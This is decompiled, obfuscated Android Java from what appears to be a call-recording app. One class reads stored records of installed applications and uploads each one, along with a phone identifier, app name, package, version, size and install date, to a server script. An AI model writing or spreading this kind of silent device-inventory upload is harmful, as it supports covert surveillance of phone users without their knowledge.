package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.C0072d;
import a.c.b.C0085q;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendApps */
public class a implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f260b;

    /* renamed from: a reason: collision with root package name */
    private final Context f261a;

    public a(Context context) {
        this.f261a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f261a.stopService(new Intent(this.f261a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:24:0x010d */
    public synchronized void run() {
        try {
            if (f260b) {
                a();
                return;
            }
            f260b = true;
            C0072d dVar = new C0072d(this.f261a);
            dVar.b();
            Cursor c2 = dVar.c();
            if (c2 != null && c2.getCount() > 0) {
                while (c2.moveToNext()) {
                    C0085q qVar = new C0085q();
                    qVar.a(c2.getInt(0));
                    qVar.b(c2.getString(1));
                    qVar.c(c2.getString(2));
                    qVar.e(c2.getString(3));
                    qVar.d(c2.getString(4));
                    qVar.a(c2.getString(5));
                    qVar.b(c2.getInt(6));
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(e.e(this.f261a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("name", qVar.c());
                    hashMap.put("namePackage", qVar.d());
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append("");
                    sb2.append(qVar.g());
                    hashMap.put("version", sb2.toString());
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("");
                    sb3.append(qVar.e());
                    hashMap.put("size", sb3.toString());
                    hashMap.put("installDate", qVar.a());
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append("");
                    sb4.append(qVar.f());
                    hashMap.put("stateApp", sb4.toString());
                    if (a.c.e.a.b("applications/insertApplication.php", (Map<String, String>) hashMap)) {
                        dVar.a(qVar.b());
                    }
                }
            }
            if (c2 != null) {
                c2.close();
            }
            f260b = false;
            a();
        } catch (Throwable th) {
            th.getStackTrace();
            Crashlytics.logException(th);
        }
    }
}
